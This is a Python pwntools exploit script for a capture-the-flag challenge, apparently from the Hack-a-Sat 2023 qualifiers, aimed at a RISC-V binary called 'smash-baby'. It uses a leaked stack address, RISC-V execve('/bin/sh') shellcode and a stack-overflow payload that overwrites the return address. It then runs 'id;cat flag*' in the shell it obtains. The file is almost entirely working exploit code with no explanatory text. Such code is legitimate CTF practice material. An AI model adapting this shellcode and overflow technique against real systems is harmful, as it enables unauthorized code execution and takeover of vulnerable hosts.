#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="riscv", os="linux")
context.log_level = 'info'

exe = ELF('./smash-baby')

def logleak(name, val):  log.info(name+" = %#x" % val)
def sla(delim,line): return p.sendlineafter(delim,line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

TICKET="your ticket here"
host, port = "riscv_smash.quals2023-kah5Aiv9.satellitesabove.me", "5300"

if args.REMOTE:
  p = remote(host,port)
  sla('please:\n', TICKET)
else:
  p = process('qemu-riscv32 -E FLAG="Superflag!!!!" -E TIMEOUT=100000 ./smash-baby', shell=True)

stack = int(rcu('useful: ', '\n'),16)
logleak('stack', stack)

# simple execve shellcode (riscv)
shellc = asm('''
  auipc a0,0x0
  addi  a0,a0,24
  li a1,0
  li a2,0
  li a7,221
  ecall
  .string "/bin/sh"
''')

payload1 = 'ACEG\xfa\xce'+shellc.ljust(300,b'\x00')
p.sendafter('me!\n', payload1)

payload2 = 'ACEGBBaaaabaaacaaadaaaeaaafaaagaaahaaaiaaa'+p32(stack-396)
p.send(payload2)
sleep(0.2)
p.sendline('id;cat flag*;echo')
p.interactive()

